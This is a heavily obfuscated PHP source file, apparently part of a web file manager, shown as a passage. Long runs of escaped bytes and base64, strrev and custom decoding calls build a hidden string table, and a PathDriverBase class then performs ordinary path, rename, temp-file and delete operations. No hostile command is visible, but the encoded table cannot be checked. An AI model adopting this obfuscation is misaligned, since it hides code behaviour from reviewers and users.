Æw'."\r".'ä'."\n".'Îî•`i¥ÕêØrÂ+I\\­œoV6rQ]ñÙ-Š(ñÃ47µ').base64_decode('odgrA4kUBkN/RZlIe4uI0CXmyOxi9mQk1t1V6Zu8erXfYLabzEKMlfVxaBrv9jnhUU9g6A==')."\x39\x20\x24\xb8\x21\xa9\x54\x3f\x1f\x16\xe1\xa1\xfe\xc9\xe2\x7e\x2b\xb7\xd1\x54\xb0\xe1\x66\x43\xc3\xdc\x2e\x2e\x65\xf5\xb0\x3c\x95\x28\x9d\xe4\xb9\x63\xc2\xba\x51\x3b\x8b\x21\x5\xda\x4d\x27\x16\xf1\x60\xb0".base64_decode('XWxH+LqglMZH1KABp7/xeeIZOPk2Gg0H8nkHSWERfFCYMZJ+Tgfo4aEvJS6QMhBChVzp2A==')."\xe4\xd2\x95\x81\x1f\x18\x26\xc9\x83\x88\x92\x9a\x5\x4e\xb7\x78\x3a\xaa\x8b\x27\x2\x9a\x63\xda\x22\x91\x12\x9e\x3d\xc7\x4a\x15\x8c\xbc\xed\xa0\x6b\xf4\xfd\xe5\xa\xf2\x98\xd8\x32\x6d\x50\xa3\x20\x15\xa\xa8"."\70\33\52\310\23\33\25\210\216\321\34\106\314\170\3\347\340\257\41\321\70\323\120\101\72\141\365\353\72\52\117\150\125\271\217\240\202\25\12\243\246\131\215\217\143\301\66\21\57\345\127\25".strrev(':œØw²'."\r".'4XÈ¡àMuX½æ‹t!`\\™™ Ì_Ær\'‰ßÓ§‰í‘Ã´'."\n".'ñ\\ÎÆá')."\x6e\x9a\xc6\x5d\x81\x58\xf4\x2a\xae\xd8\x9e\xb2\x6b\x88\xdc\x42\x8b\x41\x70\xe9\xc2\xf\x29\x80\xd\x85\x62\x2e\xc7\x4d\x66\x31\xbe\x72\x16\xd8\x50\xfe\x4f\x17\x39\x55\xd6\xd3\x3d\x63\xe4\x2b\x5d\x1a\x3b\x73"."\x6\xea\x4a\xf\xd1\xe3\xfd\x45\x5b\x70\x61\xfc\x86\x47\x2\xbb\x15\xb0\x20\x59\xf2\x80\x8a\xfd\xaf\xea\x69\x5f\x17\x75\x83\xd0\x50\xc3\x2e\xa1\x31\x3\x5d\x71\x3d\x95\x41\xca\x39\xa\x66\xd\x3d\x32\xbb\xf6"."\x3\xf9\x14\x2b\xab\x12\x1f\x93\xc2\xbb\x53\x95\x9e\xca\x2a\xdf\xe4\xea\xca\xd2\x1c\x6a\xa\xed\xcc\xc7\x16\x85\xea\xfc\x38\xca\x84\x57\x9e\x80\xc5\x93\xcb\x9e\xc1\x48\x38\xd4\x9e\x50\xc3\xc0\xdd\x6b\xeb\x66".base64_decode('+mrEDUzDEt6MaTgoO3fAo+pzdKvM0NBzqgQ35NVzDnU1HdKMyXzd1tXU1HhratH/7GYK8w==').strrev('>Â2!„Z`ÓpU¥ßWhòd\\§hà Ğë¤0'."\0".'å£"Hƒ™ĞP¬ä§şOSSRSS_Y°')."\xe2\x82\x96\x91\x55\xc7\x53\x96\xa\xb1\x99\x80\x98\xee\x1e\x4\x6e\x8c\x2\xf8\xcc\x8e\x51\xa8\x5f\x71\xc6\x2a\x51\x43\xfa\xc8\xa0\x40\x7b\xf9\x55\x6d\x4\x26\x56\xcd\x6c\x7a\x4b\xbe\x81\x37\x2a\x94\x4b\x77"."\xc9\x1f\xf3\xb1\xc1\xa5\x89\xc2\xa7\xbe\x97\x65\x78\xe5\x77\x6d\xa0\x10\x25\x74\xe2\x9c\xd5\xd1\x34\x54\xc6\xe9\xdb\x16\xa7\x20\xc9\x26\xc5\xfb\x89\x13\x24\x85\x35\x96\x71\x25\x7f\xbd\x38\x2a\x1f\xa7\x92\x6c"."\176\337\231\304\62\334\351\12\216\266\363\232\350\363\111\364\155\167\30\303\62\253\260\337\34\122\205\154\202\243\363\171\214\14\51\336\155\62\64\114\113\167\322\361\270\62\236\44\201\163\243\77"."\x61\x31\x5\x6\x60\xc4\xbf\xc8\x80\xe1\xf4\x74\xa2\x4a\x45\xe5\xb1\x9d\x8d\x1\x59\x4f\x12\xce\x92\xb8\x22\x44\xbf\x2\xfc\x11\x29\x6a\xf3\xcd\xda\xa6\x0\x45\xa1\x51\xe2\x61\x9f\x3e\xa0\x4b\xf4\x37\xf5\x87"."\x96\x4c\xae\xed\x9e\x58\x32\x47\x8e\x93\x1f\xb7\xa5\x25\x8b\x49\x33\xc5\xe\x5\xe3\x5f\x61\xc\xc9\x52\x42\x2c\x81\x1e\x67\x6\xb9\x63\x5b\xa9\x2\x77\x96\xab\x4c\x80\x9e\x25\x96\x14\x80\xf4\x52\x68\x72\xe4"."\x5a\x6\x1a\xa7\xbb\xa0\x89\xb\xdb\x20\xf7\xd4\x2d\xfb\xb5\xa5\xaa\x27\xc9\xe8\xce\x82\xb7\x45\x84\xc5\x13\xab\x63\x50\xda\x88\xfa\xf2\x5\xb3\xf\xcd\xba\x25\xf\x1a\x4a\xef\x28\x9f\xcc\xc1\x4b\x21\xcb\x0"."\361\326\313\160\162\42\76\334\145\257\163\3\72\13\27\17\132\232\63\107\11\124\70\13\220\22\235\253\131\312\10\362\267\336\344\104\274\261\225\155\334\310\256\302\131\7\336\61\73\123\170\313"."\276\4\351\230\246\303\206\247\333\145\323\157\12\46\50\22\326\102\311\347\155\252\3\115\30\256\62\223\72\74\102\302\170\305\231\116\323\250\56\302\161\142\236\40\204\56\243\263\227\344\201\24"."\x92\x45\x85\x2b\x88\xb0\x87\x85\xe3\xe\x37\xf0\x80\xa6\xf5\x4c\x16\x91\x8b\x39\xf3\xfe\x74\xee\x25\x2c\x70\x29\x83\xc2\xc3\xca\xb5\xd6\xf2\x99\x24\x1e\x52\x55\x56\x13\xe1\x15\xdd\xca\x1f\x2b\x2f\x83\x88\x4e"."\144\53\301\52\302\267\161\5\365\234\24\112\61\134\73\73\16\106\273\144\213\52\75\75\70\131\241\17\136\53\370\31\357\11\316\371\51\55\0\57\256\231\110\172\304\136\262\345\102\270\256\116"."\27\211\132\340\240\210\274\255\124\164\143\346\300\312\44\137\35\230\52\117\142\317\255\120\172\54\54\123\374\320\355\56\324\255\36\264\325\21\334\4\46\244\213\122\143\126\47\156\62\204\322\154".strrev('A6ùdF}‰iêãß6˜Á”÷û	‰Ø¹2±äÙÌÒzxk¢n¸„W"…x•w\'~')."\x8b\x78\xe7\x8a\xa6\x3a\xac\x2d\xa4\xd7\xa\x38\x28\x6a\x6\x6b\xbc\xc6\xda\x46\xcc\x6b\xc9\x63\xf\xd2\x8e\xdd\x15\x75\x1b\x23\xe3\x12\x92\x44\x83\xa2\x12\xe7\x25\x7c\xdf\x66\xac\x9b\xbd\x5\x21\x8c\x78\x49".base64_decode('UBDgP115LgusFXgUl2w/y7QPauV14hZIb8mDAFPQU2YhjRmi5BsoZ8f0PjlKDDrYahD+5A==')."\345\52\260\303\65\211\354\340\125\30\110\331\105\331\175\233\364\344\4\212\111\117\213\110\202\250\267\126\341\22\254\112\153\246\221\51\122\6\201\57\47\314\272\24\266\322\215\100\242\231\212\27"."\223\374\24\336\45\142\262\113\206\212\54\301\261\133\203\270\2\342\117\13\367\300\222\363\120\265\330\325\273\350\231\134\204\174\263\244\10\315\303\102\224\270\136\50\347\130\370\315\220\116\66\213".base64_decode('5XLKfIpkSSOaYpgGq3yJGCTIGNGZ9bu3ts47FXYw8pVDtjkDPoIWloQGeHvLyBjYjgOcgA==')."\61\45\133\6\342\301\112\370\352\41\116\271\370\174\22\357\135\74\126\220\144\11\361\104\74\161\157\45\223\165\141\314\105\315\315\61\100\147\271\174\72\102\70\273\311\161\101\300\5\200\326\207"."\63\37\136\17\21\215\241\36\266\114\207\301\246\253\22\170\242\106\176\37\205\224\22\375\20\267\50\120\222\111\337\50\221\6\106\30\245\121\307\137\354\232\10\47\162\42\71\141\362\304\122\303"."\x36\x8c\x95\x50\x25\xf5\xcd\x0\x3b\xde\xaa\x6a\xec\x9b\xc1\xa1\x6d\x6c\x1b\xe1\x37\xe8\xb1\xd1\x28\x66\xd2\xfc\x5a\x80\x25\x47\x58\x2e\x47\x4e\xcb\x11\xa1\x46\xb2\x8e\xd2\x3c\x89\x43\xd\xe9\xcc\xcd\x2\xdb"."\xa9\x77\xb4\x76\xf8\x79\x52\x23\x5f\x9e\x54\x51\x22\xfc\xa\x6\x99\x25\xaa\x3e\xac\xc3\x6\x6f\x28\x6b\xa4\x94\x48\xb4\x25\x1c\xc\x44\x9a\xc2\xf1\x5\x4a\x1f\x3e\x78\xe5\x92\xa\x79\x62\xc8\xb9\x94\x89\x96"."\x98\xe\x3c\xc3\xea\x24\x7f\xee\x6\x7\xbd\x49\xb4\x63\xf0\xa6\xf9\xae\xca\x12\xfb\x27\xd2\x17\xa8\x4c\xbc\xd\xe8\xac\x96\xe2\x9f\x5e\x28\xa9\x31\x87\xef\x3d\x66\x4a\xca\x60\xdd\x77\x19\xe8\x8c\xd0\xf4\x4a"."\xc0\xf9\x82\x5e\xa\x3f\xa2\x63\xdb\x50\xa9\xc5\x52\x81\x62\x99\xd6\x0\x7c\xf9\x2f\x90\x37\x8a\x64\x68\x24\x8\xe9\xb9\xb1\x1a\x6f\xe4\x6\xd\xcb\x10\xb\x9f\x95\x18\x91\x6b\xf\x34\xb5\x85\xdb\xd5\x40\x24"."\x12\x5d\xe4\x30\xa9\x16\x5a\xff\x2\x57\x99\xa4\xe5\xf7\xa2\xa4\x99\x11\x93\x40\xbf\x5e\xea\xbe\x12\x9c\x5\xca\x6f\x71\xb8\xd4\x28\x74\xfa\x64\x3f\xa8\x79\x76\x9a\x5\xef\xd8\xf2\xf7\x63\x68\x54\x7a\xcf\x2d"."\x5f\xd0\xc\x4b\x97\x12\xe8\xd3\x63\x93\xe1\x9a\xa1\x96\xc9\x38\x5e\x67\xcd\xf4\x4a\xd1\xa2\x93\xb3\x96\xfd\x94\x4a\x3f\xc0\xd2\x88\x48\x3b\x36\x40\x2c\xdc\xd2\x9a\xf8\xaf\x9b\x6a\xa4\x85\x87\x43\x23\xcd\x8c"."\xf0\xf8\x65\x72\xfa\xb4\x4c\x50\x7e\xc9\x97\x7d\x53\x3c\x60\x54\x9a\xf2\xdf\xbe\x87\xe7\x11\x27\x82\x2a\xf1\x10\xc7\x1e\xde\x34\xc9\x6\x9\xa4\x77\x9a\x16\x8e\xaa\x44\xfd\xad\x8a\x4f\x20\x79\xa5\x30\x92\x97"."\217\144\375\151\250\1\373\162\15\261\343\77\34\21\73\24\14\5\225\340\257\320\175\53\332\216\143\325\41\333\313\60\65\34\42\30\60\340\16\303\123\327\203\176\356\233\5\216\347\372\112\276"."\x41\x5e\x8f\xa1\x79\xe4\xc\xa\x41\xf6\x88\x3e\xa1\x18\x7f\x2d\x4a\x14\x75\xe7\x94\x69\x0\xca\x56\x84\x72\x8b\x3\x28\xd\x4a\xd\x7d\x5b\x92\xbf\x4\xa4\xcc\x61\x2e\x33\xc4\x7\x88\x3f\xc6\x50\x36\x6f\x3b"."\xf6\xf4\xad\xf2\x2d\x23\x69\x4a\x68\x2\xd6\xf4\x14\xb8\xaa\x8e\xce\x39\x8b\xe2\x89\x6d\x60\x93\xa9\xca\x5c\x92\x8\x4a\x62\xa7\x87\x6d\x52\xcd\xec\x48\x49\x82\x43\xf\x16\x61\xbd\xe1\x56\xe2\xf8\xf5\xa4\x5c"."\257\51\217\72\241\347\370\242\31\175\71\226\252\34\74\150\347\241\333\245\157\320\321\342\377\67\5\151\146\134\162\314\353\254\244\264\101\226\233\123\12\251\15\77\257\327\157\16\71\237\223\305".base64_decode('Ke4H9RxP6UkrjDiAkB//cxbylLxipZCXwBVEjGDusdEO29ISYOnTk+hPN/wybuhuBKVz8A==').base64_decode('yWqOisF+I5MucKs0kdCmCz0DKYUNszT24jl5arOJkXR4OKvcK4vYC6vz/S/xrJpgvc5npg==')."\xf8\x81\xbf\x25\x96\x90\x65\x3b\x1e\x36\x4b\x98\x9\xad\xcf\x43\x51\x15\x13\x45\x11\x6b\x1c\x91\xc3\xf2\xcd\x5\xd2\xb\x94\xc9\x74\x81\x69\x3e\xdf\x73\x25\x0\xf6\x56\x69\xda\x43\x1e\xd2\xa4\x74\xd1\xfd\x32".strrev('\'š•÷‰Uh™×ç¿ÑqÌ‡ÉÅçË_’hÀ8…ŒéŒÚÄµÇI“–¤Ìe÷K•ù9>´—')."\304\5\316\111\247\221\64\21\116\46\213\271\60\75\201\161\244\26\244\155\242\354\322\232\236\312\210\213\313\0\216\332\331\101\217\141\141\300\344\52\331\321\70\327\250\43\172\304\167\323\376\322"."\xa3\x74\x6c\x66\x6\x14\x5\x9b\xf5\x30\x7b\xaa\x1\x93\xec\xc6\x7c\xf2\x3e\xe\x0\x94\x39\x8a\x40\xd\xc7\x42\xc6\xa8\x84\x84\x69\xfa\x54\x29\xa1\x14\x32\x45\xfb\x92\x54\xe9\xd5\x38\x78\x12\xb5\xdc\x23\x70"."\24\363\311\117\223\336\313\367\104\70\56\144\3\331\203\224\60\276\161\277\126\132\372\362\52\173\145\225\55\35\170\142\265\314\273\251\143\76\273\352\21\167\324\277\354\155\71\161\43\72\217\246"."\xc2\xf9\x86\x2e\x97\x2c\xf8\xb6\xa3\x64\xe7\xe2\xde\xb4\xf0\x61\x75\x15\x88\xb9\x7\x39\x61\x96\xaa\x97\x85\xb1\x81\xe3\x51\x58\xa9\xd7\x40\xda\x4a\x1f\x96\x95\x86\x41\xea\x77\xb1\x90\xf1\x10\xbb\xb\xf\xb3".strrev('ênºl’ÄK¬¤“\\XEÜƒv ;É9ú½Rv–Ïd!+„++öİy–„÷;¥ã­6û,x')."\xf4\x93\x65\xdd\x88\x98\x42\x71\x6c\xb\x1e\x67\xe0\xf4\x19\x64\x1c\x81\x14\x8a\x13\xd\x15\xe6\x35\x5b\x5e\xfd\x24\xd3\x79\xc7\xa8\xf4\x21\x64\x17\x7\xf8\xef\x16\x8c\xd8\x7c\x50\x50\xc9\x2a\xb7\xf4\xc9\xf8".strrev('–Üæ‚íş«z-àÌÖÊ}\'¾$?L¡ñQoÎÇóÅÊ:¬K£bcáeÑI†Ù*x ’')."\xdb\x76\x91\x91\x60\x7b\x3c\xac\xbd\x15\x31\xa7\xd\x14\x28\x63\x44\xb6\xb4\x2f\x93\x6b\xb4\x4d\xb7\x26\x9\x17\xc7\x7c\x91\x68\x45\xa3\xb9\xc\xb0\x6d\xec\xc0\x43\xac\x36\x89\x12\xfd\x17\x13\xc8\xb6\x58\x74"."\67\46\214\277\160\367\35\73\163\347\50\370\117\141\144\246\314\263\305\222\151\314\227\364\201\112\172\174\153\351\325\154\257\204\234\222\46\122\267\243\144\262\201\134\210\35\260\263\337\256\352\121".strrev('T˜õ|½IÉc,uÒÈŞ\\•|~I‘NßÛ PÇï×f—A%#N7^“ÜT¨GGQ1')."\x24\xaf\x8f\xd2\xaa\xa5\xa7\x6c\x85\x82\x89\x68\xa4\xa0\x47\xb0\xb8\x89\xad\x4\x69\x66\xa0\x85\x5f\x5c\xd7\x24\x4b\x3e\xa7\xd6\xb\x84\x3b\xe9\x1d\x76\x34\x7c\xd2\x53\xe5\xa6\x1c\x96\x9e\x48\x46\x3c\x21\xca"."\xee\x8c\xa0\xe6\x38\xb6\xb1\x28\xde\xe4\x7a\xc6\x9e\xd0\x2f\xf7\xdb\xf6\x6c\xcc\x8\xd1\x10\xf4\x50\x72\x88\xe0\xd8\x2a\xf1\xd7\x3d\x1d\x5b\x27\xcb\xfd\xc4\x2f\x12\x5\x1d\xcf\xa8\xa4\x4b\x5e\x45\x7\xc2\x49".base64_decode('7hPSr0msV3BZEWovZkVE0h2T/RbPdPiNwK4RXTSCeaOwXC9/U6/rNMy2Bf/r123/Xz1qOw==').base64_decode('vYZp+XH9/MJgCwjn0Fp8lMp1HVTD7OqHk72OByxCg+8bFESFxLnJOHOPybxmauykTctkJA==').strrev('œ˜æP5#9I ²ÂbM1àÊšï‰t”÷‹/eà¢.ñùû´Öûˆ¹uLş¾B8äòS;~\\&')."\xd8\xc3\x3a\x5f\x49\x90\x84\x93\x12\x30\xd1\x6\x24\xc3\x30\xbf\xa3\x7e\x16\x4a\xe1\xed\x22\xf1\xb1\x3\xa3\x27\xfb\x41\x88\xe6\xd9\xc6\xb2\x1a\xb8\x40\xcf\x29\x8c\x5a\x11\xdf\x2b\x40\xb4\x64\x42\xe5\x48\x2a"."\41\157\11\307\234\70\22\345\341\26\64\310\307\246\323\121\242\315\365\232\62\5\262\344\261\165\234\14\224\132\115\224\226\346\164\100\56\202\55\365\235\252\61\74\301\270\141\336\32\257\53\241"."\xd6\xeb\xaa\x8e\x3f\x28\xed\xc4\x75\xc7\xb\xc7\xd4\xd2\x4\x2d\x90\x18\x56\x81\x30\x55\x18\x39\x5c\x22\xa7\xcc\xde\xd2\x32\x14\xaf\xe3\x2\x66\x8c\x95\x55\x7e\x7d\xf3\x46\x9\x75\x20\xe\xc9\xe3\xc1\xe8\x44"."\107\301\44\202\242\63\225\253\205\44\313\350\224\244\163\165\313\176\64\171\222\257\204\153\61\222\351\230\51\154\232\47\16\65\23\321\130\110\135\24\306\76\73\302\247\205\72\231\267\151\303\44"."\257\260\260\52\73\333\252\310\155\75\130\0\150\27\323\154\12\124\322\21\61\223\24\300\302\145\262\235\315\7\371\21\254\363\66\270\164\45\202\71\54\223\125\222\116\140\174\257\305\271\26\347"."\226\3\113\231\5\113\366\67\352\310\304\142\227\211\162\143\154\37\335\231\103\13\131\117\331\172\132\301\14\334\41\323\167\115\253\231\332\363\145\265\240\174\16\71\355\53\40\141\163\21\237\352"."\x65\x56\xbc\xc\xa6\x6c\x39\x93\x3a\x18\x2a\x97\x87\x70\x33\x6e\x3b\x90\x48\x3c\xe1\xe3\x7e\xba\xa7\xd9\xe1\xbc\xab\x5e\x52\x91\x2a\xc4\x8d\x19\xbc\xe1\x34\xc6\xdc\xb4\x9b\x41\x21\x5a\xb8\xf2\x30\x69\x18\x3b"."\x17\xef\x4e\xf9\x39\x33\x7b\xf1\x5\x5b\xc8\xf9\xb1\x97\x33\x7c\xd\xc3\x4f\xf0\x8f\x79\xf0\x50\xb3\x2a\x33\x18\xc2\x3a\x1\xa1\xd9\x21\x14\xb7\x74\x4f\x8\x5f\xb2\xb\x23\xd1\x42\x2c\xcb\x6f\x5f\x10\x6d\xe"._kodDe('LsBF5ChQJBAHORfU16NYZoVqLiI2IjlbYyX+Fzi+rWZzf250pwXveH09hCE6qOcH2Bsr+/g=')."\37\123\44\233\236\141\5\6\65\356\306\315\135\252\323\261\221\225\216\345\123\204\102\204\112\117\136\305\201\260\44\75\262\142\170\47\54\30\273\53\135\242\250\202\347\151\203\102\26\26\173\261"."\x74\xba\x59\x1b\x2c\x3\x9a\xd6\xdd\x6e\xf8\x50\xa\x7\x25\xb2\xb4\xe4\x6d\x44\x5c\x89\xd1\x87\xe4\xaf\x3\x9c\xb8\xb1\xe2\x0\x2c\x4d\x15\xde\x48\xa4\xf2\xe2\xc\x4e\x74\x13\xa7\x95\xeb\x3e\xa1\x70\xce\xe2"."\262\267\23\216\124\42\211\76\152\305\155\130\244\175\57\66\362\21\306\55\264\53\134\275\43\76\351\364\255\302\301\370\234\41\30\162\245\316\353\110\165\355\344\261\46\215\311\201\256\54\320\55"."\x49\xd5\x97\x55\x41\x49\x28\xa0\x67\x22\x52\x75\xf2\x49\xfc\x98\x5\xe2\xe5\x3f\x22\xb0\xd2\x39\xc4\x92\x53\x1a\x91\xc1\x44\x16\xd3\x31\xf8\x12\xcf\xe2\x1d\x3\xc8\x98\x9c\xe9\x68\x8e\x7b\x6a\xc9\xc6\x53\xa0"."\57\115\314\22\65\76\315\13\70\263\50\274\356\152\275\134\300\335\63\132\302\361\336\241\234\76\144\330\251\176\151\227\134\232\131\232\136\50\31\154\150\100\371\176\270\133\313\306\332\255\73\20".strrev('™t¨ºƒ¥{£ÑZÙÊJã%Â³d–Ë…šYpc”q9±Ip³F-•ĞÊe˜Ió2G´”•')."\xb\x8d\x8d\x4\x3a\xd6\x78\x96\x5\x2e\xfd\x1c\x60\xa2\x1b\x9a\x28\xaf\xca\xb7\x42\xe8\x9c\x5c\xe6\x16\xe5\x5a\x51\x16\x78\xcc\x56\xb8\xa1\x85\xcc\x81\x77\xa0\xe5\x72\x1c\xd6\x49\x4e\x8e\x52\x8e\x6e\xb3\x9c"._kodDe('LYUjQ4sikoe+GnUaQAG8Vmp8/RjZ5aLsFB2sHoQaTKiGe1SWhocjscSGuQAfaQH4VQv6CQE=').strrev('ß0UJ†+‰:ö_òQ\\ıDæÔ—8÷œ–.}…¥=œ™È˜¤¬“û²p@c`‰').base64_decode('6xM2bnTPbNpGSnc64JfdXtJ89pGMpIZ2aYCFmsphAFNGL0qSQGIWhzG0Pkk4EjjhuO1FRQ==')._kodDe('KiwGlrfTu2A1tYcyAwt9vmxdttBqzCCQEiSL2OfFq2GoQVXpNjg2usDMcA0XlT8shLjZFoE=')."\xc7\x67\x4\x6d\x9\xc5\x22\x41\x38\x88\xc7\xa\x97\xb8\x4e\x73\x9\x9d\x73\x44\xf0\xb1\x1c\x8f\xc8\x6c\x16\xe\xe4\x9b\x8b\x2e\x93\x1\x91\x30\x60\xa6\x93\xe6\x30\xf3\x35\x89\x9d\x7f\x88\xf6\x88\x83\x3b\xcd"."\55\133\12\261\10\120\121\66\375\42\56\126\54\77\315\361\303\153\117\136\122\7\274\343\352\133\226\357\163\24\247\57\143\162\23\355\57\253\1\224\367\242\12\372\324\13\321\244\302\155\264\170".strrev('Õ=œ’´ƒ¸ViK^]®êØy%#„j•¶hêÉ+¥2JRl’˜eôMcEÇˆÕ’^"')."\212\160\160\201\150\111\251\263\130\166\126\26\201\247\76\305\274\110\147\107\371\176\223\35\11\61\370\270\226\141\312\40\351\154\101\317\12\267\266\242\214\123\307\45\317\277\305\374\117\363\200\363"."\x39\x46\x97\x11\x2c\x43\x6c\xa8\x8\x5b\xd6\xb5\x43\xdd\xb1\x3c\xa4\xe2\x17\x75\x38\x7d\xe0\x72\xbe\x30\xef\xf0\x39\xcc\x40\xa4\x74\xb2\x86\x8\x51\x92\x70\x53\xe6\xf7\x24\x61\x72\xd9\x1\x92\xcf\x1a\x4a\xcf".base64_decode('wUiuGADcsPkmmGUuM5PSORfdZcFtchhSyXqShh3ZttZX1hqCqpAxlRDK3f8D9OQ4qWy4AA==').base64_decode('AA==').""."".""."", 10, -8))); goto FÈµ•Üïƒ; FÈµ•Üïƒ: define($_SERVER[è¶³ÒßÑ][0], $_SERVER[è¶³ÒßÑ][1]); $_SERVER[àÚÌê´İ] = explode($_SERVER[è¶³ÒßÑ][2], gzinflate(substr($_SERVER[è¶³ÒßÑ][3], 10, -8))); function binCheckEq($‘óã“Œ…, $Œ¬İà£’) { return $‘óã“Œ… == $Œ¬İà£’; } goto fõœÀ°òø´; C‚œ‡œ­¬÷: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $çóŠû˜¾ =& $_SERVER[è¶³ÒßÑ]; $this->objectDriver = array($çóŠû˜¾[70], $çóŠû˜¾[71], $çóŠû˜¾[72], $çóŠû˜¾[73], $çóŠû˜¾[74], $çóŠû˜¾[75], $çóŠû˜¾[76], $çóŠû˜¾[77], $çóŠû˜¾[78], $çóŠû˜¾[79], $çóŠû˜¾[80], $çóŠû˜¾[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¸ğ»ªù¡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¸ğ»ªù¡, $_SERVER[è¶³ÒßÑ][8]); } return $¸ğ»ªù¡; } public function iconvApp($Ğˆ¼ Ø½) { return $Ğˆ¼ Ø½; } public function iconvSystem($ÙêÏè™Š) { return $ÙêÏè™Š; } public function iconvTo($ÛäŒ¤·, $¾ÓìŠø³, $îÌÂîËê) { $§’Úá¥Ù =& $_SERVER[è¶³ÒßÑ]; if (!$ÛäŒ¤· || !function_exists($§’Úá¥Ù[82])) { return $ÛäŒ¤·; } static $í›ÇµÆÍ = array(); $Ù®øšç¸ = $¾ÓìŠø³ . $§’Úá¥Ù[83] . $îÌÂîËê . $§’Úá¥Ù[84] . $ÛäŒ¤·; if (isset($í›ÇµÆÍ[$Ù®øšç¸])) { return $í›ÇµÆÍ[$Ù®øšç¸]; } if (function_exists($§’Úá¥Ù[85])) { $Ó™Ä€”› = @mb_convert_encoding($ÛäŒ¤·, $îÌÂîËê, $¾ÓìŠø³); } else { $Ó™Ä€”› = @iconv($¾ÓìŠø³, $îÌÂîËê, $ÛäŒ¤·); } $Ó™Ä€”› = $Ó™Ä€”› ? $Ó™Ä€”› : $ÛäŒ¤·; if (strstr($Ó™Ä€”›, $§’Úá¥Ù[86])) { $Ó™Ä€”› = str_replace($§’Úá¥Ù[86], $§’Úá¥Ù[11], $Ó™Ä€”›); } $í›ÇµÆÍ[$¾ÓìŠø³ . $§’Úá¥Ù[83] . $îÌÂîËê . $§’Úá¥Ù[84] . $ÛäŒ¤·] = $Ó™Ä€”›; $í›ÇµÆÍ[$îÌÂîËê . $§’Úá¥Ù[83] . $¾ÓìŠø³ . $§’Úá¥Ù[84] . $ÛäŒ¤·] = $ÛäŒ¤·; $í›ÇµÆÍ[$îÌÂîËê . $§’Úá¥Ù[83] . $¾ÓìŠø³ . $§’Úá¥Ù[84] . $Ó™Ä€”›] = $ÛäŒ¤·; $í›ÇµÆÍ[$¾ÓìŠø³ . $§’Úá¥Ù[83] . $îÌÂîËê . $§’Úá¥Ù[84] . $Ó™Ä€”›] = $Ó™Ä€”›; return $Ó™Ä€”›; } public function getPathInner($òŒşØ´ß) { $‚İƒæÎú = IO::init($òŒşØ´ß); return $‚İƒæÎú->path; } public function getPathOuter($İÄåáğ) { $ÕığûëÇ =& $_SERVER[è¶³ÒßÑ]; $Ö ·£Ü = strlen(trim($this->pathBase, $ÕığûëÇ[8])); $İÄåáğ = substr(trim($İÄåáğ, $ÕığûëÇ[8]), $Ö ·£Ü); return $this->pathDriver . $ÕığûëÇ[8] . ltrim($İÄåáğ, $ÕığûëÇ[8]); } public function isParentOf($Ë¨ŸÂ¥¨, $ŸˆŸ®àÉ) { $°˜ËÎÎ¨ =& $_SERVER[è¶³ÒßÑ]; $Ë¨ŸÂ¥¨ = rtrim(strtolower($Ë¨ŸÂ¥¨), $°˜ËÎÎ¨[8]) . $°˜ËÎÎ¨[8]; $ŸˆŸ®àÉ = rtrim(strtolower($ŸˆŸ®àÉ), $°˜ËÎÎ¨[8]) . $°˜ËÎÎ¨[8]; $À‡÷‹Ğ = strpos($ŸˆŸ®àÉ, $Ë¨ŸÂ¥¨) === 0; return $À‡÷‹Ğ; } public function getType() { $Á¬§“ã¡ =& $_SERVER[è¶³ÒßÑ]; $ß”¤Ô£½ = str_replace($Á¬§“ã¡[87], $Á¬§“ã¡[12], get_class($this)); return strtolower($ß”¤Ô£½); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ë©ÔáïÊ, $÷çßÔ¯²) { $¯˜äˆœú =& $_SERVER[è¶³ÒßÑ]; $ÂÆç™íæ = rtrim($Ë©ÔáïÊ, $¯˜äˆœú[8]) . $¯˜äˆœú[8] . $÷çßÔ¯²; $«Ç¨Æ¡« = $this->exist($ÂÆç™íæ); return $«Ç¨Æ¡« ? $ÂÆç™íæ : !1; } public function setModifyTime($Âè‚¯ıá, $ÇŒĞÅÙ³ = '') { } public function renameObject($ñü¯, $îÉ¦©Ç) { $ÛĞû¡‡ß = $îÉ¦©Ç; $ñü¯ = $this->getPathOuter($ñü¯); $îÉ¦©Ç = $this->pathFather($ñü¯) . $îÉ¦©Ç; $Ú¹²ášç = IO::copy($ñü¯, $this->pathFather($ñü¯), REPEAT_RENAME_FOLDER, $ÛĞû¡‡ß); if ($Ú¹²ášç) { IO::remove($ñü¯); } return $Ú¹²ášç ? $îÉ¦©Ç : !1; } public function tempFile($‰¶×ã×¡ = '', $‹ »œ· = '') { if (!$‰¶×ã×¡) { $‰¶×ã×¡ = rand_string(15); } $ÅôÉ ªÀ = TEMP_FILES . rand_string(15) . $_SERVER[è¶³ÒßÑ][8]; @mkdir($ÅôÉ ªÀ, DEFAULT_PERRMISSIONS, !0); $ÔèÒÜÄÚ = $ÅôÉ ªÀ . $‰¶×ã×¡; @touch($ÔèÒÜÄÚ); if ($‹ »œ·) { file_put_contents($ÔèÒÜÄÚ, $‹ »œ·); } return $ÔèÒÜÄÚ; } public function tempFileRemve($”Ã¤şş) { @unlink($”Ã¤şş); @rmdir($this->pathFather($”Ã¤şş)); } public function mkfile($‡ã¨‹ÇÅ, $ù“—ö„Î = '', $åÓ®¸ìÏ = REPEAT_RENAME) { } public function mkdir($˜üÌı, $ì©¡§†Õ = REPEAT_SKIP) { } public function delFile($¨”‰¥ÄÛ) { } public function delFolder($˜³¾Ş) { } public function copyFile($‘øçáíº, $ƒğüòº) { } public function moveFile($ïÃÅ±ƒî, $Ñ¯å ) { } public function remove($œ­Ô‰àÊ) { if ($this->isFile($œ­Ô‰àÊ)) { return $this->delFile($œ­Ô‰àÊ); } return $this->delFolder($œ­Ô‰àÊ); } public function rename($ğå×¼€Š, $¿®ø’¥) { } public function exist($¹‚İ¹Úª) { } public function findByHash($´ˆÒ×áí = '', $õÄ°Òª = '') { return !1; } public function isFile($İßÍÀ’») { } public function isFolder($ûï¬ïœï) { } public function size($‰ŒöÁ•) { } public function info($£¤Şà¬) { } public function infoSimple($Íñ¿¦¥Ì) { return $this->info($Íñ¿¦¥Ì); } public function infoAuth($İÈĞ¢®‚) { return $this->info($İÈĞ¢®‚); } public function infoFull($ ğ¯®ÖÍ) { return $this->info($ ğ¯®ÖÍ); } public function 